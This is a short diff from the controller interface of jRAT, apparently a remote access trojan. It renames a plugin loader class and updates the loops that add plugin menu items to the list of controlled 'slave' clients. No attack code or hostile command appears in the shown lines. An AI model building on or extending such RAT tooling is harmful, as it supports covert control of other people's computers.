@@ -36,7 +36,7 @@ import se.jrat.controller.AbstractSlave;
 import se.jrat.controller.Main;
 import se.jrat.controller.Slave;
 import se.jrat.controller.Status;
-import se.jrat.controller.addons.PluginLoader;
+import se.jrat.controller.addons.Plugins;
 import se.jrat.controller.addons.RATObjectFormat;
 import se.jrat.controller.listeners.CountryMenuItemListener;
 import se.jrat.controller.net.URLParser;
@@ -887,13 +887,13 @@ public class PanelMainClients extends JScrollPane {
 			}
 		});
 
-		for (RATPlugin plugin : PluginLoader.getPlugins()) {
+		for (RATPlugin plugin : Plugins.getPlugins()) {
 			if (plugin.getMenuItems() != null && plugin.getMenuItems().size() > 0) {
 				popupMenu.addSeparator();
 				break;
 			}
 		}
-		for (RATPlugin plugin : PluginLoader.getPlugins()) {
+		for (RATPlugin plugin : Plugins.getPlugins()) {
 			if (plugin.getMenuItems() != null && plugin.getMenuItems().size() > 0) {
 				for (final RATMenuItem en : plugin.getMenuItems()) {
 					JMenuItem item = en.getItem();
